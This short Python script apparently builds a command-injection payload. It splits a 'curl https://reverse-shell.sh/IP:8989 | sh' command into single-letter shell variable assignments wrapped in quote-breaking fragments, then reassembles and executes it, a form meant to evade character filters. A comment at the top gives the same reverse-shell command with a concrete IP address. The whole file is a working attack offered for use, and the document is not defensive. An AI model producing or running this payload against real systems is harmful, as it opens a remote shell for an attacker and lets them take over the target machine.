# curl https://reverse-shell.sh/5.253.63.135:8989 | sh
from string import ascii_letters

shell = 'curl https://reverse-shell.sh/x.x.x.x:8989'
letters = set(shell)
mapping = {}
for l, s in zip(letters, ascii_letters):
    mapping[l] = s
    if l == ' ':
        continue

exploit = []
for m in mapping:
    if m != ' ':
        exploit.append(f"{mapping[m]}={m}")
    else:
        exploit.append(f"{mapping[m]}=' '")
exploit.append("Z=''")
for i in shell:
    exploit.append(f"Z=$Z${mapping[i]}")

exploit.append("Y=''")
exploit.append(f"Y=$Y${mapping['s']}")
exploit.append(f"Y=$Y${mapping['h']}")
exploit.append('$Z|$Y')
print('";' + '",\n";'.join(exploit) + '"')
